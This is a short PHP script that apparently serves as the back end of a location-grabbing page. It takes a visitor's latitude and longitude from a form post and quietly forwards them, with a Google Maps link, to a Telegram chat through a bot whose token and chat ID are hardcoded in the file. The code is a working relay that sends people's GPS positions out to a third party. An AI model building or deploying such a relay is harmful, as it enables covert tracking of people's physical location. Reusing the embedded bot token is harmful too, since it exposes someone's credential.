
<?php
$token = "7723202416:AAHGcGq9XYJbXd3fgJHHl64CJ-Ovau2KI44";
$chat_id = "7932600874";
$lat = $_POST['lat'];
$lon = $_POST['lon'];
$map = "https://www.google.com/maps?q=$lat,$lon";
$text = "📍 Lokasi GPS:
Latitude: $lat
Longitude: $lon
📌 $map";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($text));
?>
